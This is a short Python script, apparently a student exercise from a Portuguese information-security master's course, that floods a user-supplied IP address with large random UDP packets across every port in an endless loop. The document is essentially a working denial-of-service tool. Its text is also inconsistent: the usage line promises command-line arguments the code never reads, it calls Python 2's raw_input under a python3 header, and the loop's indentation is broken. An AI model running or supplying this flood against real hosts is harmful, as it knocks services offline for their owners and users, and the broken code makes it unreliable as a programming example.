#!/usr/bin/env python3
"""
Mestrado de Engenharia em Segurança Informatica
Linguagens de Programação Dinamicas - UDP Flood

Martinho Caeiro (23917)

Este script envia pacotes UDP para múltiplos alvos em várias portas.

Uso:
    python3 udp_flood.py <alvo> <porta>

Exemplo:
    python3 udp_flood.py alvo 1
"""
import socket
import random
import time

#creates a socket
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(65000) #creates packet
ip=raw_input('Target IP:') #The IP we are attacking
sent=0

##Infinitely loops sending packets to the port until the program is exited
while 1:
 for i in range(1,65536):
 port=i
 sock.sendto(bytes,(ip,port))
 print("Sent %s amount of packets to %s at port %s" %(sent,ip,port))
 sent=sent+1
 time.sleep(0.10) # esperar 1/10 de segundo por cada pacote enviado